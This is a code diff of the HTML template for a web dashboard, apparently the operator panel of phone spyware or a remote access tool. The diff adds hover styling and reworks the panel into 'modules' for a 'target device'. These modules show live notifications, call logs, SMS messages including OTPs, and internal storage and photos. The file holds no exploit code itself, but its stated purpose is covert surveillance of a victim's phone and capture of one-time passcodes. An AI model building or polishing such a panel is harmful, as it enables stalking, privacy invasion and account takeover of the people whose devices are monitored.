@@ -6,6 +6,19 @@
     <title>RS Dashboard Workspace</title>
     <link rel="stylesheet" href="/static/css/style.css">
     <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        /* Pro-level Card Hover Animations */
+        .nav-card {
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            border: 1px solid transparent;
+        }
+        .nav-card:hover {
+            transform: translateY(-5px);
+            border-color: var(--accent-cyan);
+            box-shadow: 0 10px 20px rgba(0, 210, 255, 0.1);
+            background: rgba(255, 255, 255, 0.05);
+        }
+    </style>
 </head>
 <body>
     <div class="app-container">
@@ -19,8 +32,10 @@
                 <li class="active"><a href="/dashboard"><i data-lucide="layout-dashboard"></i> Overview</a></li>
                 <li><a href="/permissions"><i data-lucide="shield-check"></i> Permissions</a></li>
                 <li><a href="/notifications"><i data-lucide="bell"></i> Notifications</a></li>
+                <li><a href="/calls"><i data-lucide="phone"></i> Call Logs</a></li>
+                <li><a href="/messages"><i data-lucide="message-square"></i> SMS History</a></li>
                 <li><a href="/files"><i data-lucide="folder-open"></i> Storage</a></li>
-                <li><a href="/logs"><i data-lucide="file-text"></i> System Logs</a></li>
+                <li><a href="/logs"><i data-lucide="terminal"></i> System Logs</a></li>
             </ul>
             <div style="margin-top: auto; padding-top: 20px;">
                 <a href="#" id="logout-action" style="display: flex; align-items: center; gap: 10px; color: var(--text-muted); text-decoration: none;">
@@ -101,35 +116,50 @@
                 </div>
             </div>
 
-            <!-- Permission-Locked Features -->
-            <div class="dashboard-grid">
-                <!-- 1. INJECTED NOTIFICATIONS UI -->
-                <div class="glass-panel" id="notifications-wrapper" style="padding: 25px; min-height: 250px;">
-                    <h3 class="card-title">Live Notification Sync</h3>
-                    <p style="color: var(--text-muted); font-size: 0.9rem;">Real-time incoming alerts from the target device.</p>
-                    <div id="dashboard-notif-feed" style="margin-top: 15px; display: flex; flex-direction: column; gap: 10px;">
-                        <!-- Mini feed will dynamically load here -->
+            <!-- Hub & Spoke Navigation Grid -->
+            <h3 style="margin: 30px 0 15px 0; font-weight: 600; font-size: 1.1rem;">Security & Data Modules</h3>
+            <div class="dashboard-grid" style="grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));">
+                
+                <!-- Notifications Module -->
+                <a href="/notifications" class="glass-panel nav-card" style="text-decoration: none; display: block; padding: 25px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <h3 class="card-title" style="margin: 0; color: white;">Live Notifications</h3>
+                        <i data-lucide="bell" style="color: var(--accent-cyan);"></i>
                     </div>
-                    <a href="/notifications" style="display: block; margin-top: 15px; color: var(--accent-cyan); text-decoration: none; font-size: 0.9rem; font-weight: bold;">View Full Logs >></a>
-                </div>
+                    <p style="color: var(--text-muted); font-size: 0.9rem; margin-top: 10px;">Monitor app alerts, social media messages, and system push notifications.</p>
+                    <div style="margin-top: 15px; color: var(--accent-cyan); font-size: 0.85rem; font-weight: bold;">OPEN MODULE &raquo;</div>
+                </a>
 
-                <!-- 2. UPGRADED CALL LOGS UI -->
-                <div class="glass-panel" id="calls-wrapper" style="padding: 25px; min-height: 250px;">
-                    <h3 class="card-title">Secure Telephone Call Monitoring</h3>
-                    <p style="color: var(--text-muted); font-size: 0.9rem;">Telephony activity tracking metrics verified under system permissions configurations.</p>
-                    <div id="dashboard-calls-feed" style="margin-top: 15px; display: flex; flex-direction: column; gap: 10px;">
-                        <!-- Dynamic Call Logs will render here -->
+                <!-- Call Logs Module -->
+                <a href="/calls" class="glass-panel nav-card" style="text-decoration: none; display: block; padding: 25px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <h3 class="card-title" style="margin: 0; color: white;">Call Monitoring</h3>
+                        <i data-lucide="phone" style="color: var(--accent-cyan);"></i>
                     </div>
-                </div>
+                    <p style="color: var(--text-muted); font-size: 0.9rem; margin-top: 10px;">Access complete telephony history including incoming, outgoing, and missed calls.</p>
+                    <div style="margin-top: 15px; color: var(--accent-cyan); font-size: 0.85rem; font-weight: bold;">OPEN MODULE &raquo;</div>
+                </a>
 
-                <!-- 3. UPGRADED SMS UI -->
-                <div class="glass-panel" id="sms-wrapper" style="padding: 25px; min-height: 250px;">
-                    <h3 class="card-title">Text Message Transceiver History</h3>
-                    <p style="color: var(--text-muted); font-size: 0.9rem;">Programmatic messages streams and log updates indicators storage.</p>
-                    <div id="dashboard-sms-feed" style="margin-top: 15px; display: flex; flex-direction: column; gap: 10px;">
-                        <!-- Dynamic SMS will render here -->
+                <!-- SMS Module -->
+                <a href="/messages" class="glass-panel nav-card" style="text-decoration: none; display: block; padding: 25px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <h3 class="card-title" style="margin: 0; color: white;">SMS Transceiver</h3>
+                        <i data-lucide="message-square" style="color: var(--accent-cyan);"></i>
                     </div>
-                </div>
+                    <p style="color: var(--text-muted); font-size: 0.9rem; margin-top: 10px;">Read text message streams, OTPs, and conversational SMS logs.</p>
+                    <div style="margin-top: 15px; color: var(--accent-cyan); font-size: 0.85rem; font-weight: bold;">OPEN MODULE &raquo;</div>
+                </a>
+
+                <!-- File Storage Module -->
+                <a href="/files" class="glass-panel nav-card" style="text-decoration: none; display: block; padding: 25px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <h3 class="card-title" style="margin: 0; color: white;">File Storage</h3>
+                        <i data-lucide="folder-open" style="color: var(--accent-cyan);"></i>
+                    </div>
+                    <p style="color: var(--text-muted); font-size: 0.9rem; margin-top: 10px;">Browse target device internal storage, photos, and downloaded media.</p>
+                    <div style="margin-top: 15px; color: var(--accent-cyan); font-size: 0.85rem; font-weight: bold;">OPEN MODULE &raquo;</div>
+                </a>
+
             </div>
         </main>
     </div>
@@ -138,7 +168,6 @@
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script src="/static/js/auth.js"></script>
     <script src="/static/js/app.js"></script>
-    <script src="/static/js/realtime.js"></script>
     <script src="/static/js/dashboard.js"></script>
     <script>lucide.createIcons();</script>
 </body>
